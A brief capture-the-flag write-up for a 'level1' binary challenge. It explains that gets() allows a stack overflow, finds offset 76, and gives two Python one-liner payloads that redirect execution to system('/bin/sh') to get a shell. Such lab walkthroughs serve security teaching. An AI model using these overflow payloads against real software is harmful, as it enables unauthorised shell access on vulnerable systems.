# level1

The `gets()` on the buffer allows us to do a buffer overflow

There is a function `run`, that you can find with `gdb> info function`, inside there is a `"/bin/sh"` string and a call to `system` function

We can find the right offset with a [Buffer OverFlow Pattern Generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/): we get `76`

Thus we can jump inside `run()` and call `system("/bin/sh")`:

```bash
(python -c "print 'A' * 76 + '\x72\x84\x04\x08'" ; cat ) | ./level1 # 0x08048472
```

or

You can call `system` directly:
```bash
(python -c "print 'A' * 76 + '\x60\x83\04\x08' + 'DUMM' + '\x84\x85\x04\x08'"; cat) | ./level1
```
